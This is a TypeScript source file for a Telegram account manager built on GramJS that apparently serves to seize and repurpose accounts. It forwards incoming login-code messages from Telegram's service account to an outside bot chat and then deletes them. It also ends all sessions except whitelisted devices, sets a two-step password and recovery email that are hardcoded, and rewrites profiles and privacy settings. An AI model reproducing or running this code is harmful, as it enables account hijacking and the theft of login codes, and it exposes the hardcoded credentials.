import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage } from 'telegram/events';
import { Api } from 'telegram/tl';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import mongoose from 'mongoose';
import { ActiveChannelsService } from '../activechannels/activechannels.service';
import { ActiveChannel, ActiveChannelSchema } from '../activechannels/schemas/active-channel.schema';
import { contains, parseError } from '../../../utils';
import { TotalList, sleep } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';

class TelegramManager {
    private session: StringSession;
    private phoneNumber: string;
    private client: TelegramClient | null;
    private channelArray: string[];
    private activeChannelsService: ActiveChannelsService;

    constructor(sessionString: string, phoneNumber: string) {
        console.log(sessionString);
        this.activeChannelsService = new ActiveChannelsService(mongoose.model(ActiveChannel.name, ActiveChannelSchema))
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            await this.client.disconnect();
            await this.client.destroy();
        }
        this.session.delete();
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async createClient(handler = true): Promise<TelegramClient> {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            this.client.setLogLevel(LogLevel.ERROR);
            await this.client.connect();
            const me = <Api.User>await this.client.getMe();
            console.log("Connected Client : ", me.phone);
            if (handler && this.client) {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
            }
            return this.client
        } catch (error) {
            console.log(parseError(error));
            return undefined
        }
    }

    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(): Promise<TotalList<Dialog>> {
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        return chats
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{ photoCount: number; videoCount: number; movieCount: number }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            } else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
        }

        return { photoCount, videoCount, movieCount };
    }

    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[] }> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        console.log(chats.total);
        chats.forEach(async (chat) => {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = <Api.Channel>await chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    console.log(parseError(error));
                }
            }
        });
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
    }

    async joinChannels(str: string): Promise<void> {
        const channels = str.split('|');
        console.log(this.phoneNumber, " - channelsLen - ", channels.length);
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            console.log(this.phoneNumber, "Trying: ", channel);
            try {
                const joinResult = await this.client?.invoke(
                    new Api.channels.JoinChannel({
                        channel: await this.client?.getEntity(channel)
                    })
                );
                console.log(this.phoneNumber, " - Joined channel Success - ", channel);
                try {
                    const chatEntity = <Api.Channel>await this.client?.getEntity(channel);
                    const { title, id, broadcast, defaultBannedRights, participantsCount, megagroup, username } = chatEntity;
                    const entity = {
                        title,
                        id: id.toString(),
                        username,
                        megagroup,
                        participantsCount,
                        broadcast
                    };
                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
                        entity['canSendMsgs'] = true;
                        try {
                            await this.activeChannelsService.update(entity.id.toString(), entity)
                            console.log("updated ActiveChannels");
                        } catch (error) {
                            console.log(parseError(error));
                            console.log("Failed to update ActiveChannels");
                        }
                    } else {
                        await this.activeChannelsService.remove(entity.id.toString());
                        // await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        console.log("Removed Channel- ", channel);
                    }
                } catch (error) {
                    console.log(this.phoneNumber, " - Failed - ", error);
                }
            } catch (error) {
                console.log("Channels ERR: ", error);
                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                    const activeChannel = await this.activeChannelsService.search({ username: channel.replace('@', '') })
                    await this.activeChannelsService.remove(activeChannel[0]?.channelId);
                    // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    console.log("Removed Channel- ", channel);
                }
            }
            console.log(this.phoneNumber, " - On waiting period");
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            console.log(this.phoneNumber, " - Will Try next");
        }
        console.log(this.phoneNumber, " - finished joining channels");
        if (this.client) {
            await this.client.disconnect();
            // await deleteClient(this.phoneNumber);
        }
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.log(parseError(error))
                        console.log(parseError(error))
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName, about) {
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                })
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(4000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                }
            }
        }
        return newUserName;
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            throw e
        }
    }
    async getFileUrl(url: string, filename: string): Promise<string> {
        const response = await axios.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        return filePath;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded- ", file)
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            throw error
        }
    }

    async set2fa() {
        const imapService = MailReader.getInstance();
        try {
            imapService.connectToMail();
            const intervalParentId = setInterval(async () => {
                const isReady = imapService.isMailReady();
                if (isReady) {
                    clearInterval(intervalParentId);
                    await this.client.updateTwoFaSettings({
                        isCheckPassword: false,
                        email: "storeslaksmi@gmail.com",
                        hint: "password - India143",
                        newPassword: "Ajtdmwajt1@",
                        emailCodeCallback: async (length) => {
                            console.log("code sent");
                            return new Promise(async (resolve) => {
                                let retry = 0
                                const intervalId = setInterval(async () => {
                                    console.log("checking code");
                                    retry++
                                    const isReady = imapService.isMailReady();
                                    if (isReady && retry < 4) {
                                        const code = await imapService.getCode();
                                        console.log('Code: ', code)
                                        if (code) {
                                            clearInterval(intervalId);
                                            imapService.disconnectFromMail()
                                            resolve(code);
                                        }else{
                                            console.log('Code: ', code) 
                                        }
                                    } else {
                                        clearInterval(intervalId);
                                        await this.client.disconnect();
                                        imapService.disconnectFromMail()
                                        resolve(undefined);
                                    }
                                }, 10000);
                            });
                        },
                        onEmailCodeError: (e) => { console.log(parseError(e)); return Promise.resolve("error") }
                    })
                }
            }, 5000);
        } catch (e) {
            console.log(e)
            parseError(e)
        }
    }
    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(result)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: <Api.TypeInputPhoto[]><unknown>result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            throw error
        }
    }
}
export default TelegramManager;
